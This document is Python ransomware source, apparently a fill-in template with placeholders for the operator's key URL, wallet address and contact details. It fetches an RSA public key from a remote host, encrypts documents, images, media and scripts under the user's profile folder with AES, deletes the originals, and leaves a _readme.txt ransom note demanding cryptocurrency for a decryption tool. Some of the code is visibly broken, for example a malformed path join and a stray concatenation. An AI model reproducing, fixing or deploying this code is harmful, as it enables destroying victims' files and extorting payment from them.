import os
import random
import requests as req
from time import sleep
from cryptography.fernet import Fernet as xf
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

url_web = "YOUR URL PUBLIC KEY"
url_list = []
URL_KEY = url_web + random.choice(url_list)
pbk = req.get(URL_KEY).text
lcx = URL_KEY.split('/')[3].split('.')[0]

WALLET_ADDRESS ='''YOUR WALLET ADDRESS'''

CONTACT = '''CONTACT HERE'''

def attack(target):

    fl = ".c",".dll",".jpeg",".JPEG",".jpg",".JPG",".png",".PNG",".bmp",".BMP",".doc",".DOC",".docx",".xls",".xlsx",".ppt",".pptx",".pdf",".mp4",".mkv",".mpeg",".avi",".ai",".ait",".cdr",".odt",".ods",".odp",".msi",".bat",".vbs",".html",".php",".js",".css"

    for p, d, f in os.walk(target):
        for name in f:
            if name.endswith((fl)):
                try:
                    with open(p + name, "rb") as mfile:
                        data = mfile.read()
                        newFile = os.path.join(p, name) +  ".itsec"
                        file_out = open(newFile, "wb")

                        recipient_key = RSA.importKey(pbk)
                        session_key = get_random_bytes(16)

                        # Encrypt the session key with the public RSA key
                        cipher_rsa = PKCS1_OAEP.new(recipient_key)
                        enc_session_key = cipher_rsa.encrypt(session_key)

                        # Encrypt the data with the AES session key
                        cipher_aes = AES.new(session_key, AES.MODE_EAX)
                        ciphertext, tag = cipher_aes.encrypt_and_digest(data)
                        [ file_out.write(x) for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext) ]
                        file_out.close()
                        mfile.close()
                        os.remove(os.path.join(p, name))
                except:
                    continue

            # Tinggalkan pesan pada lines dibawah ini
            try:
                lines = '''        !ATTENTION!
                Don't worry, you can return all your files!
                All your files like photos, database, documents,
                and other important are encrypted with strongest encryption and unique key.
                I want to continue my studies, But need some money,
                If you want to back your file, you can buy my decrypt tools
                Price of decrypt tools is $10 - $1000 depend on large files''' + '''

                Choice one payment'''
                + WALLET_ADDRESS + '''
                
                Your Personal Key is : ''' + lcx + '''

                ''' + CONTACT + '''
                Thank You For Your Attention (*v*)'''
                with open(p + '\\' + '_readme.txt', 'w') as f:
                    f.writelines(lines)
            except PermissionError:
                problem = "Tidak bisa di isi file"

if __name__ == '__main__':
    t0 = os.environ["USERPROFILE"]
    attack(t0)